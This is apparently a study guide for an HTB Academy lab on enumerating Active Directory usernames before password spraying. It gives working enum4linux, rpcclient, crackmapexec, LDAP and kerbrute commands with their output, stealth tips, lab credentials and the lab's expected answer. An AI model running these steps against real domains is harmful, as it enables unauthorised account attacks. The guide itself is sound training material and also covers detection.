# Password Spraying - Making a Target User List

## 📋 Overview

Creating an accurate and comprehensive user list is the foundation of successful password spraying attacks. This process involves gathering valid domain usernames through various enumeration techniques, while respecting account lockout policies to avoid disrupting operations.

## 🎯 Why User Enumeration Matters

### 🔍 **Attack Prerequisites**
- **Valid Target List**: Password spraying requires accurate usernames
- **Lockout Avoidance**: Must avoid triggering account lockouts
- **Efficiency**: Larger, accurate lists improve success rates
- **Stealth**: Some methods generate fewer logs than others

### ⚠️ **Critical Considerations**
- **Password Policy**: Must be known before spraying
- **Account Monitoring**: Track `badpwdcount` values
- **Documentation**: Log all activities for client reference
- **Timing**: Coordinate attempts based on lockout windows

---

## 🔓 SMB NULL Session Enumeration

### 📋 **enum4linux - User Enumeration**
```bash
# Extract clean username list
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

**Example Output:**
```
administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday
```

### 🔧 **rpcclient - User Enumeration**
```bash
# Connect with NULL session
rpcclient -U "" -N 172.16.5.5

# Enumerate domain users
rpcclient $> enumdomusers
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
```

### ⚡ **CrackMapExec - Enhanced User Info**
```bash
# Get users with bad password count tracking
crackmapexec smb 172.16.5.5 --users
```

**Key Benefits:**
- Shows `badpwdcount` (failed login attempts)
- Displays `baddpwdtime` (last failed attempt)
- Helps identify accounts close to lockout threshold

**Example Output:**
```
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613
```

---

## 🌐 LDAP Anonymous Bind Enumeration

### 🔍 **ldapsearch - LDAP Queries**
```bash
# Get users via LDAP (modern syntax)
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

**Example Output:**
```
guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
```

### 🪟 **windapsearch - User-Friendly LDAP**
```bash
# Anonymous LDAP enumeration
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

**Example Output:**
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users: 

cn: Guest

cn: Htb Student
userPrincipalName: htb-student@inlanefreight.local

cn: Annie Vazquez
userPrincipalName: avazquez@inlanefreight.local

cn: Paul Falcon
userPrincipalName: pfalcon@inlanefreight.local
```

---

## 🎫 Kerbrute User Enumeration

### ⚡ **Kerberos Pre-Authentication Method**

#### **Key Advantages:**
- **Fast**: Much faster than SMB-based methods
- **Stealthy**: No Event ID 4625 (logon failure) generated
- **No Lockouts**: Username enumeration doesn't count toward lockout
- **Large Scale**: Can test thousands of usernames quickly

#### **How It Works:**
1. Sends TGT requests without Kerberos Pre-Authentication
2. **PRINCIPAL UNKNOWN** = Invalid username
3. **Pre-Auth required** = Valid username exists

### 🚀 **Kerbrute Commands**

```bash
# Basic user enumeration
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# Save results to file
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt

# Verbose output
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -v
```

### 📊 **Example Kerbrute Output**

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local

2022/02/17 22:16:23 >  Done! Tested 48705 usernames (56 valid) in 12.315 seconds
```

### 📈 **Performance Metrics**
- **48,705 usernames tested** in 12.315 seconds
- **56 valid usernames discovered**
- **~3,950 usernames/second** testing rate

---

## 🔑 Credentialed User Enumeration

### ⚡ **CrackMapExec with Valid Credentials**
```bash
# Enumerate with domain credentials
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

**Enhanced Information:**
- Complete user list access
- Account status information
- Bad password count tracking
- Last bad password attempt timestamps

**Example Output:**
```
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD! 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613
```

---

## 📋 Username List Sources

### 🎯 **External Intelligence Gathering**

#### **LinkedIn Username Generation**
```bash
# Generate usernames from LinkedIn profiles
linkedin2username -u company_name

# Common formats generated:
# john.smith
# jsmith
# j.smith
# smith.john
```

#### **Email Harvesting**
```bash
# theHarvester for email enumeration
theHarvester -d company.com -l 500 -b google

# Extract usernames from email format
# john.smith@company.com -> john.smith
```

#### **Statistical Username Lists**
- **statistically-likely-usernames** GitHub repo
- **jsmith.txt**: 48,705 usernames in `flast` format
- **Common formats**: firstlast, flast, lastfirst, first.last

### 📊 **Username Format Patterns**

| **Format** | **Example** | **Description** |
|------------|-------------|-----------------|
| `flast` | `jsmith` | First initial + last name |
| `firstlast` | `johnsmith` | Full first + last name |
| `first.last` | `john.smith` | First + dot + last |
| `lastfirst` | `smithjohn` | Last + first name |
| `f.last` | `j.smith` | First initial + dot + last |

---

## 📊 Enumeration Method Comparison

| **Method** | **Speed** | **Stealth** | **Accuracy** | **Requirements** | **Event Generation** |
|------------|-----------|-------------|--------------|------------------|---------------------|
| **SMB NULL Session** | Medium | Medium | High | Legacy misconfiguration | Event ID 4624/4625 |
| **LDAP Anonymous** | Medium | Medium | High | Anonymous bind enabled | Minimal events |
| **Kerbrute** | Fast | High | Medium | Network access to DC | Event ID 4768 only |
| **Credentialed** | Fast | Low | High | Valid domain credentials | Normal auth events |

---

## 🎯 HTB Academy Lab Walkthrough

### 📝 Lab Question
*"Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?"*

### 🚀 Step-by-Step Solution

#### 1️⃣ **Connect to Attack Host**
```bash
# SSH to ACADEMY-EA-ATTACK01
ssh htb-student@10.129.54.201
# Password: HTB_@cademy_stdnt!
```

#### 2️⃣ **Verify Wordlist**
```bash
# Check if wordlist exists
ls -la /opt/jsmith.txt
wc -l /opt/jsmith.txt

# Preview wordlist format
head -10 /opt/jsmith.txt
```

#### 3️⃣ **Find Domain Controller**
```bash
# Discovery methods from previous documentation
nmap -sn 172.16.5.0/24
ping 172.16.5.5

# Verify it's a DC
nmap -p 88,389,445 172.16.5.5
```

#### 4️⃣ **Run Kerbrute User Enumeration**
```bash
# Basic enumeration
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# Save output for counting
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt

# Count valid users
grep "VALID USERNAME" valid_users.txt | wc -l
```

#### 5️⃣ **Expected Results Analysis**
```bash
# Example successful output:
# Tested 48705 usernames (56 valid) in 12.315 seconds

# Count from output file
cat valid_users.txt | grep "\[+\] VALID USERNAME" | wc -l
```

### ✅ **Expected Answer**: `56` valid usernames

#### 6️⃣ **Bonus: Extract Clean Username List**
```bash
# Extract just the usernames
grep "VALID USERNAME" valid_users.txt | awk '{print $4}' | cut -d'@' -f1 > clean_usernames.txt

# Verify count
wc -l clean_usernames.txt
```

---

## 🛡️ Security Considerations

### 🚨 **Event ID Monitoring**

| **Event ID** | **Description** | **Generated By** |
|--------------|-----------------|------------------|
| **4768** | Kerberos TGT requested | Kerbrute enumeration |
| **4625** | Account logon failed | SMB/RDP/other auth failures |
| **4624** | Account logon successful | Successful authentication |
| **4740** | Account locked out | Too many failed attempts |

### 🔍 **Detection Indicators**
- **High volume of Event ID 4768** in short timeframe
- **Sequential TGT requests** from single source
- **Unusual authentication patterns** outside business hours
- **Failed authentication spikes** across multiple accounts

### 🛡️ **Defensive Recommendations**
- **Monitor Kerberos events** for enumeration patterns
- **Implement account lockout policies** but not too aggressive
- **Use honey accounts** to detect enumeration attempts
- **Network segmentation** to limit DC access

---

## 📝 Attack Documentation Template

### 📋 **Required Logging Fields**
```
Date: 2024-01-15
Time: 14:30:00 UTC
Method: Kerbrute User Enumeration
Target DC: 172.16.5.5
Domain: inlanefreight.local
Wordlist: /opt/jsmith.txt (48,705 entries)
Results: 56 valid usernames discovered
Duration: 12.315 seconds
```

### 🎯 **User List Management**
```bash
# Create organized user lists
mkdir -p user_lists
cp valid_users.txt user_lists/kerbrute_$(date +%Y%m%d_%H%M%S).txt

# Clean format for tools
grep "VALID USERNAME" user_lists/kerbrute_*.txt | \
  awk '{print $4}' | cut -d'@' -f1 | sort -u > user_lists/clean_usernames.txt
```

---

## ⚡ Quick Reference Commands

### 🔓 **Unauthenticated Methods**
```bash
# SMB NULL Session
enum4linux -U DC_IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N DC_IP # then: enumdomusers
crackmapexec smb DC_IP --users

# LDAP Anonymous
ldapsearch -H ldap://DC_IP -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))"
./windapsearch.py --dc-ip DC_IP -u "" -U

# Kerbrute
kerbrute userenum -d domain.local --dc DC_IP wordlist.txt -o output.txt
```

### 🔑 **Credentialed Methods**
```bash
# CrackMapExec with creds
crackmapexec smb DC_IP -u username -p password --users

# PowerView (from Windows)
Import-Module .\PowerView.ps1
Get-DomainUser | Select samaccountname
```

---

## 🔑 Key Takeaways

### ✅ **Enumeration Best Practices**
- **Multiple Methods**: Use various techniques for comprehensive coverage
- **Stealth Priority**: Prefer Kerbrute for large-scale enumeration
- **Documentation**: Log all activities for client coordination
- **Validation**: Cross-reference results from different methods

### ⚠️ **Critical Warnings**
- **Monitor Bad Password Counts**: Avoid accounts near lockout
- **Respect Lockout Policies**: Never exceed safe attempt thresholds
- **Time-Based Coordination**: Space attempts based on lockout windows
- **Event Generation**: Understand what logs your methods create

### 🎯 **Next Steps After User Enumeration**
1. **Password Policy Review**: Confirm lockout thresholds
2. **Target List Refinement**: Remove high-risk accounts
3. **Password List Creation**: Build targeted wordlists
4. **Spray Planning**: Schedule attempts within policy limits

---

*Accurate user enumeration is the foundation of successful password spraying - take time to build comprehensive, clean lists while respecting account lockout policies.* 